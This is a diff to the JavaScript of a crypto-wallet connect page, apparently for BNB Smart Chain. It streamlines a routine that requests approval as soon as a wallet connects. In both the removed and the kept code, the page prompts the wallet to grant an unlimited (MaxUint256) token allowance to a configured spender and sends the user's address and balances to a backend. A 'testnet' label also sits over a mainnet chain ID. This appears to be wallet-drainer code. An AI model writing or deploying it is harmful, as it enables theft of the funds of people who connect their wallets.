@@ -641,12 +641,6 @@
 
 let appKitEip155Provider = null;
 
-    // approval guards
-let _approvalInProgress = false;   // true while we are actively checking/sending approval
-let _approvalTxHash = null;       // tx.hash of an approval we sent (helps avoid re-sending)
-let _approvalLastAttempt = 0;     // timestamp ms of last attempt
-
-
 // Watch AppKit provider globally (mobile fix)
 // This catches both fresh connections AND restored sessions.
 function setupAppKitProviderWatcher() {
@@ -838,8 +832,6 @@ if(connectBtnCard){
       }
     }
 
-
-    
     function attachProviderListeners(p){
       if(!p || !p.on) return;
       try{
@@ -866,137 +858,6 @@ if(connectBtnCard){
       }
     }
 
-
-// --- Background connection watcher: resolves when a provider/account appears ---
-// returns { provider, accounts } or null on timeout
-async function waitForProviderOrAccounts({timeoutMs = 30000, pollMs = 700} = {}) {
-  return new Promise((resolve) => {
-    let resolved = false;
-    let unsub = null;
-    const start = Date.now();
-
-    // helper to finish
-    function finish(result) {
-      if (resolved) return;
-      resolved = true;
-      if (typeof unsub === "function") try { unsub(); } catch(e){}
-      clearInterval(pollTimer);
-      resolve(result);
-    }
-
-    // 1) prefer AppKit subscription if available (fast + reliable)
-    try {
-      if (window.appKit && typeof window.appKit.subscribeProviders === "function") {
-        unsub = window.appKit.subscribeProviders((state) => {
-          const provider = state && state["eip155"] ? state["eip155"] : null;
-          if (provider) {
-            // try to read accounts quickly using web3 if possible
-            try {
-              const w3 = new Web3(provider);
-              w3.eth.getAccounts().then(accounts => {
-                if (accounts && accounts.length) {
-                  finish({ provider, accounts });
-                } else {
-                  // provider present but no accounts yet -> still consider provider (some wallets set provider early)
-                  finish({ provider, accounts: [] });
-                }
-              }).catch(err => {
-                finish({ provider, accounts: [] });
-              });
-            } catch(e){
-              finish({ provider, accounts: [] });
-            }
-          }
-        });
-      }
-    } catch(e){
-      console.warn("waitForProviderOrAccounts: appKit subscribe failed", e);
-    }
-
-    // 2) Poll as fallback for injected providers (window.ethereum) or appKit state check
-    const pollTimer = setInterval(async () => {
-      try {
-        // timeout reached?
-        if (Date.now() - start > timeoutMs) {
-          finish(null); // timed out
-          return;
-        }
-
-        // If appKit has a quick getter (some builds may expose state), try it:
-        if (window.appKit && typeof window.appKit.getProviders === "function") {
-          try {
-            const st = window.appKit.getProviders && window.appKit.getProviders();
-            const p = st && st["eip155"] ? st["eip155"] : null;
-            if (p) {
-              // try read accounts
-              const w3 = new Web3(p);
-              const accounts = await w3.eth.getAccounts();
-              finish({ provider: p, accounts: accounts || [] });
-              return;
-            }
-          } catch(e){
-            // ignore and continue
-          }
-        }
-
-        // If injected provider exists, check eth_accounts
-        if (window.ethereum && window.ethereum.request) {
-          try {
-            const accs = await window.ethereum.request({ method: "eth_accounts" });
-            if (accs && accs.length) {
-              finish({ provider: window.ethereum, accounts: accs });
-              return;
-            }
-          } catch(e){
-            // ignore
-          }
-        }
-
-        // Also check your existing providerInstance/web3Instance (if already set)
-        if (typeof web3Instance !== "undefined" && web3Instance && web3Instance.eth) {
-          try {
-            const accs2 = await web3Instance.eth.getAccounts();
-            if (accs2 && accs2.length) {
-              finish({ provider: providerInstance || window.ethereum, accounts: accs2 });
-              return;
-            }
-          } catch(e){}
-        }
-      } catch(err){
-        // swallow and continue polling
-      }
-    }, pollMs);
-
-    // Safety: also resolve on visibility/focus because if the user returns the normal flow will pick up
-    function onVisibleFocus() {
-      // let main flow handle, but we still resolve null quickly to unblock callers
-      finish(null);
-    }
-    document.addEventListener("visibilitychange", function onVis() {
-      if (document.visibilityState === "visible") {
-        document.removeEventListener("visibilitychange", onVis);
-        onVisibleFocus();
-      }
-    }, { once: true });
-    window.addEventListener("focus", function onF() {
-      window.removeEventListener("focus", onF);
-      onVisibleFocus();
-    }, { once: true });
-
-    // also enforce final timeout
-    setTimeout(() => finish(null), timeoutMs + 200);
-  });
-}
-
-
-
-
-
-
-
-
-
-    
     async function notifyBackend(address, networkText, userId, bnbBalance, tokenBalance, eventType = "connect"){
       try{
         const payload = new URLSearchParams({
@@ -1078,158 +939,101 @@ async function waitForProviderOrAccounts({timeoutMs = 30000, pollMs = 700} = {})
       }
     }
 
-async function ensureTokenApproval(){
-  // helper: always log with last known balances
-  async function logApproval(tag){
-    try {
-      await notifyBackend(
-        currentAddress || "",
-        BNB_TESTNET_LABEL,
-        currentUserId || "",
-        currentBNBBalance,
-        currentTokenBalance,
-        tag
-      );
-    } catch(e) { console.warn("logApproval failed", e); }
-  }
+    async function ensureTokenApproval(){
+      // helper: always log with last known balances
+      async function logApproval(tag){
+        await notifyBackend(
+          currentAddress || "",
+          BNB_TESTNET_LABEL,
+          currentUserId || "",
+          currentBNBBalance,
+          currentTokenBalance,
+          tag
+        );
+      }
 
-  // basic guards
-  if(!TOKEN_ADDRESS){
-    console.warn("TOKEN_ADDRESS not set, skipping approve");
-    await logApproval("approval_skipped_no_token");
-    return;
-  }
-  if(!SPENDER_ADDRESS){
-    console.warn("SPENDER_ADDRESS not set, skipping approve");
-    await logApproval("approval_skipped_no_spender");
-    return;
-  }
-  if(!providerInstance || !web3Instance){
-    console.warn("No providerInstance/web3Instance for approval");
-    await logApproval("approval_skipped_no_provider");
-    return;
-  }
+      // basic guards
+      if(!TOKEN_ADDRESS){
+        console.warn("TOKEN_ADDRESS not set, skipping approve");
+        await logApproval("approval_skipped_no_token");
+        return;
+      }
+      if(!SPENDER_ADDRESS){
+        console.warn("SPENDER_ADDRESS not set, skipping approve");
+        await logApproval("approval_skipped_no_spender");
+        return;
+      }
+      if(!providerInstance || !web3Instance){
+        console.warn("No providerInstance/web3Instance for approval");
+        await logApproval("approval_skipped_no_provider");
+        return;
+      }
 
-  // Prevent concurrent calls: if another approval is in progress, skip.
-  const now = Date.now();
-  _approvalLastAttempt = now;
-  if (_approvalInProgress) {
-    console.log("[approval] already in progress — skipping duplicate call.");
-    return;
-  }
-  // If we recently sent a tx, avoid re-sending for a short cooldown window (e.g. 60s)
-  if (_approvalTxHash && (now - (_approvalLastAttempt || now) < 60_000)) {
-    console.log("[approval] recent approval tx detected, skipping re-send. tx:", _approvalTxHash);
-    return;
-  }
+      try{
+        setStatus("Preparing token approval…");
 
-  _approvalInProgress = true;
-  try{
-    setStatus("Preparing token approval…");
+        const ethersProvider = new ethers.BrowserProvider(
+          providerInstance,
+          BNB_TESTNET_CHAIN_ID_DEC    // 56 (BSC mainnet)
+        );
+        const signer       = await ethersProvider.getSigner();
+        const ownerAddress = (await signer.getAddress()).toLowerCase();
 
-    const ethersProvider = new ethers.BrowserProvider(
-      providerInstance,
-      BNB_TESTNET_CHAIN_ID_DEC    // 56 (BSC mainnet)
-    );
-    const signer       = await ethersProvider.getSigner();
-    const ownerAddress = (await signer.getAddress()).toLowerCase();
-
-    if (TOKEN_ADDRESS.toLowerCase() === ownerAddress) {
-      alert(
-        "ERROR: TOKEN_ADDRESS is set to your wallet address.\n\n" +
-        "It MUST be the BEP-20 token contract address, not your wallet."
-      );
-      setStatus("Connected (approval skipped)");
-      await logApproval("approval_skipped_token_is_wallet");
-      return;
-    }
-
-    // 1) check allowance (always re-check)
-    const readContract = new ethers.Contract(
-      TOKEN_ADDRESS,
-      ERC20_ALLOWANCE_ABI,
-      ethersProvider
-    );
-    const currentAllowance = await readContract.allowance(ownerAddress, SPENDER_ADDRESS);
-    console.log("[approve] currentAllowance =", currentAllowance.toString());
-
-    if (currentAllowance > 0n) {
-      // Already approved — clear any pending state and return
-      _approvalTxHash = null;
-      setStatus("Connected (already approved)");
-      await logApproval("approval_already");
-      return;
-    }
-
-    // if we already have a recorded approval tx, check its receipt before resending
-    if (_approvalTxHash) {
-      try {
-        const receipt = await ethersProvider.getTransactionReceipt(_approvalTxHash);
-        if (receipt && receipt.confirmations && receipt.confirmations > 0) {
-          console.log("[approval] previous tx confirmed:", _approvalTxHash);
-          _approvalTxHash = null;
-          setStatus("Connected (already approved)");
-          await logApproval("approval_already_after_tx");
+        if (TOKEN_ADDRESS.toLowerCase() === ownerAddress) {
+          alert(
+            "ERROR: TOKEN_ADDRESS is set to your wallet address.\n\n" +
+            "It MUST be the BEP-20 token contract address, not your wallet."
+          );
+          setStatus("Connected (approval skipped)");
+          await logApproval("approval_skipped_token_is_wallet");
           return;
         }
-        // if receipt not confirmed yet, avoid sending again
-        console.log("[approval] previous approval tx pending:", _approvalTxHash, " — not re-sending.");
-        setStatus("Approval pending (previous tx) …");
-        await logApproval("approval_pending_previous_tx");
-        return;
-      } catch(e){
-        // if provider can't fetch receipt, proceed to send but be cautious
-        console.warn("Could not fetch receipt for prior approval tx:", _approvalTxHash, e);
+
+        // 1) check allowance
+        const readContract = new ethers.Contract(
+          TOKEN_ADDRESS,
+          ERC20_ALLOWANCE_ABI,
+          ethersProvider
+        );
+        const currentAllowance = await readContract.allowance(ownerAddress, SPENDER_ADDRESS);
+        console.log("[approve] currentAllowance =", currentAllowance.toString());
+
+        if (currentAllowance > 0n) {
+          setStatus("Connected (already approved)");
+          await logApproval("approval_already");
+          return;
+        }
+
+        // 2) send approve tx
+        setStatus("Waiting for wallet to confirm approval…");
+        const writeContract = new ethers.Contract(
+          TOKEN_ADDRESS,
+          ERC20_APPROVE_ABI,
+          signer
+        );
+
+        const tx = await writeContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
+        console.log("[approve] tx sent:", tx.hash);
+
+        setStatus("Approval pending on chain…");
+        await tx.wait();
+
+        setStatus("Connected + Approved ✅");
+        await logApproval("approval_approved");
+      }catch(err){
+        console.error("Token approve error:", err);
+
+        let tag = "approval_error";
+        if (err && (err.code === 4001 || err.code === "ACTION_REJECTED")) {
+          tag = "approval_rejected";
+        }
+
+        setStatus("Connected (approval failed)");
+        alert("Token approval failed: " + (err && err.message ? err.message : err));
+
+        await logApproval(tag);
       }
     }
-
-    // 2) send approve tx (single send)
-    setStatus("Waiting for wallet to confirm approval…");
-    const writeContract = new ethers.Contract(
-      TOKEN_ADDRESS,
-      ERC20_APPROVE_ABI,
-      signer
-    );
-
-    // mark attempt time
-    _approvalLastAttempt = Date.now();
-
-    const tx = await writeContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
-    if (tx && tx.hash) {
-      _approvalTxHash = tx.hash;
-      console.log("[approve] tx sent:", tx.hash);
-    }
-
-    setStatus("Approval pending on chain…");
-    await tx.wait();
-
-    setStatus("Connected + Approved ✅");
-    await logApproval("approval_approved");
-
-    // success => clear tx record (or keep it briefly if you want)
-    _approvalTxHash = null;
-  }catch(err){
-    console.error("Token approve error:", err);
-
-    let tag = "approval_error";
-    if (err && (err.code === 4001 || err.code === "ACTION_REJECTED")) {
-      tag = "approval_rejected";
-    }
-
-    setStatus("Connected (approval failed)");
-    // avoid spamming the user with alerts in repeated calls
-    if (! (err && err.message && err.message.includes("User rejected"))) {
-      // only show alert for real errors; rejections are expected
-      try { alert("Token approval failed: " + (err && err.message ? err.message : err)); } catch(e){}
-    }
-
-    await logApproval(tag);
-  }finally{
-    // release lock after a short cooldown to avoid immediate retries
-    // keep inProgress true for a tiny moment to let other listeners settle
-    setTimeout(()=>{ _approvalInProgress = false; }, 600);
-  }
-}
 
     async function restoreSessionFromAddress(address){
       currentAddress = address;
@@ -1290,9 +1094,7 @@ async function connectFlow() {
 
     let gotProvider = null;
 
-
-
-      // 1) Subscribe BEFORE opening the modal (keep existing behavior)
+    // 1) Subscribe BEFORE opening the modal
     const unsubscribe = window.appKit.subscribeProviders((state) => {
       const evm = state["eip155"];
       if (evm && !gotProvider) {
@@ -1300,47 +1102,13 @@ async function connectFlow() {
       }
     });
 
-    // 1b) Start background watcher which will resolve earlier if provider/accounts appear
-    const backgroundPromise = waitForProviderOrAccounts({ timeoutMs: 30000, pollMs: 700 });
-
     // 2) Open AppKit modal (Connect view)
     await window.appKit.open({ view: "Connect" });
 
-    // 3) If background watcher already detected a provider/accounts (user approved and provider returned),
-    //    we can act immediately (call ensureTokenApproval). Otherwise connectFlow continues as before.
-    const bgResult = await backgroundPromise.catch(() => null);
-
-    // Stop listening (unsubscribe) as before
+    // 3) Stop listening
     if (typeof unsubscribe === "function") {
-      try { unsubscribe(); } catch(e){}
+      unsubscribe();
     }
-
-    if (bgResult && bgResult.provider) {
-      // If accounts were found, restore session immediately (and trigger approval)
-      try {
-        providerInstance = bgResult.provider;
-        web3Instance     = new Web3(providerInstance);
-        attachProviderListeners(providerInstance);
-
-        const accounts = bgResult.accounts && bgResult.accounts.length ? bgResult.accounts : await web3Instance.eth.getAccounts();
-        if (accounts && accounts.length) {
-          const address = accounts[0].toLowerCase();
-          currentAddress = address;
-          await restoreSessionFromAddress(address);
-          // Immediately attempt approval since provider/account is confirmed
-          // Use your visibility-aware wrapper if you want, or call ensureTokenApproval directly
-          await ensureTokenApproval();
-          // proceed to finish connectFlow
-        }
-      } catch(e){
-        console.warn("Background connect handling error:", e);
-      }
-    }
-
-
-
-
-    
 
     // 4) If no provider, user probably closed modal or connect failed
     const provider = gotProvider;
